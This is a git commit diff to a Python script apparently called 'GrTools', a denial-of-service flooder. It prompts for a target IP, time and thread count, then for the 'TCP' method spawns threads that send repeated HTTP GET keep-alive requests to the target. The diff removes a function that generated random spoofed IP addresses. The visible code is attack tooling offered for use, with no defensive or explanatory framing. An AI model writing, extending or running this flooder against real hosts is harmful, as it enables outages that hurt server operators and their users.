a0867cc884463c365d28bf9f8b8c5bb4ddfcd756
ViaTopiaa <82694530+ViaTopiaa@users.noreply.github.com>
2023-09-23 22:32:27 +0700

    Update g.py

--- g.py
+++ g.py
@@ -4,16 +4,6 @@ import datetime
 import threading
 import time
 
-def spoofer():
-    addr = [101, 168, 0, 1]
-    d = '.'
-    addr[0] = str(random.randrange(11, 197))
-    addr[1] = str(random.randrange(0, 255))
-    addr[2] = str(random.randrange(0, 255))
-    addr[3] = str(random.randrange(2, 254))
-    assembled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
-    return assembled
-
 expiration_date = datetime.datetime.now() + datetime.timedelta(days=7)
 
 ip = input("\033[36m╔══\n╚══════>Server@GrTools~ Enter Target IP :\n ")
@@ -22,8 +12,7 @@ t = int(input("\033[36m╔══\n╚══════>Server@GrTools~ Input Ti
 th = int(input("\033[36m╔══\n╚══════>Server@GrTools~ Input Thread :\n "))
 method = input("╔══\n╚══════>Server@GrTools~~ Enter Methods :\n ")
 
-if method == "TCP":
-                
+if method == "TCP":     
     def tcpfl():
         get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
         connection = "Connection: Keep-Alive\r\n" + "\r\n"
@@ -53,7 +42,6 @@ if method == "TCP":
     for _ in range(th):
         if method == "TCP":
             t = threading.Thread(target=tcpfl)
-            t.daemon = True
             t.start()
 
 
